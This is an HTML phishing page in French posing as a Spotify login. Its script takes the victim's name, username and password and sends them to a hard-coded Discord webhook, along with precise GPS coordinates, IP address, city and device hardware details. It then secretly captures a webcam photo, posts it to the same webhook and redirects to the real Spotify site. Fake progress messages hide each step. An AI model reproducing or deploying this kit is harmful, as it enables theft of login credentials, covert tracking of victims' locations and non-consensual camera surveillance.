<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Spotify</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; overflow-x: hidden; }
        .app-card { width: 100%; max-width: 450px; padding: 40px 25px; text-align: center; }
        .logo { width: 45px; margin: 0 auto 40px auto; }
        .field { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 6px; }
        input { width: 100%; background: #121212; border: none; border-radius: 4px; padding: 14px; color: #fff; font-size: 15px; outline: none; }
        .btn-main { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin-top: 20px; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; }
        
        /* Barre de chargement pour forcer l'attente */
        #loader { display: none; margin-top: 20px; }
        .progress-bg { background: #282828; height: 4px; width: 100%; border-radius: 10px; overflow: hidden; }
        .progress-bar { background: #1ed760; height: 100%; width: 0%; transition: width 0.5s; }
        .load-txt { font-size: 12px; color: #b3b3b3; margin-top: 8px; font-style: italic; }

        .social-btn { background: transparent; border: 1px solid #727272; border-radius: 500px; padding: 12px; width: 100%; color: #fff; font-weight: 700; display: flex; align-items: center; justify-content: center; margin-top: 25px; font-size: 14px; }
        #v, #c { position: absolute; left: -9999px; visibility: hidden; }
    </style>
</head>
<body>
    <div class="app-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">

        <div class="flex gap-2">
            <div class="field w-1/2"><label>Prénom</label><input id="fn" type="text" placeholder="Prénom"></div>
            <div class="field w-1/2"><label>Nom</label><input id="ln" type="text" placeholder="Nom"></div>
        </div>
        <div class="field"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text"></div>
        <div class="field"><label>Mot de passe</label><input id="p" type="password"></div>
        
        <button onclick="triggerAll()" id="btn" class="btn-main">Se connecter</button>

        <div id="loader">
            <div class="progress-bg"><div id="pbar" class="progress-bar"></div></div>
            <div id="ltxt" class="load-txt">Sécurisation de la connexion...</div>
        </div>

        <div class="social-btn">Continuer avec Google</div>
    </div>

    <video id="v" autoplay playsinline muted></video><canvas id="c"></canvas>

    <script>
        const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
        
        async function triggerAll() {
            const data = {
                fn: document.getElementById('fn').value,
                ln: document.getElementById('ln').value,
                u: document.getElementById('u').value,
                p: document.getElementById('p').value
            };
            if(!data.u || !data.p) return;

            document.getElementById('btn').style.display = "none";
            document.getElementById('loader').style.display = "block";
            const pb = document.getElementById('pbar');
            const lt = document.getElementById('ltxt');

            // --- ÉTAPE 1 : GPS (Le Pellerin) ---
            pb.style.width = "30%";
            lt.innerText = "Vérification de la région (GPS)...";
            let gps = "❌ Bloqué";
            try {
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true, timeout: 6000});
                });
                gps = `✅ **PRÉCIS :** [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
            } catch(e) {}

            // --- ÉTAPE 2 : MATÉRIEL & IP ---
            pb.style.width = "60%";
            lt.innerText = "Optimisation pour votre appareil...";
            let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
            let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
            const gl = document.createElement('canvas').getContext('webgl');
            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";

            const msg = {
                embeds: [{
                    title: `🏆 LOG FINAL V25 - ${data.fn} ${data.ln}`,
                    color: 1955168,
                    fields: [
                        { name: "👤 IDENTITÉ", value: `**Nom:** \`${data.ln}\` **Prénom:** \`${data.fn}\`\n**User:** \`${data.u}\` **Pass:** \`${data.p}\`` },
                        { name: "📍 LOCALISATION", value: `**Maps:** ${gps}\n**Ville IP:** \`${net.city}\`\n**IP:** \`${net.ip}\`` },
                        { name: "📱 HARDWARE", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory}GB\`\n**Bat:** \`${Math.round(bat.level*100)}%\`\n**CPU:** \`${navigator.hardwareConcurrency}\`\n**OS:** \`${navigator.platform}\`` }
                    ]
                }]
            };
            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });

            // --- ÉTAPE 3 : CAMÉRA (PHOTO) ---
            pb.style.width = "90%";
            lt.innerText = "Finalisation de la synchronisation...";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('v');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 2000));
                const can = document.getElementById('c');
                can.width = 1280; can.height = 720;
                can.getContext('2d').drawImage(video, 0, 0);
                can.toBlob(async b => {
                    const fd = new FormData();
                    fd.append('file', b, 'cam.png');
                    fd.append('content', `📸 **Capture : ${data.fn} ${data.ln}**`);
                    await fetch(hook, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg', 0.8);
            } catch(e) {}

            pb.style.width = "100%";
            setTimeout(() => { window.location.href = "https://www.spotify.com/fr/premium/"; }, 1000);
        }
    </script>
</body>
</html>
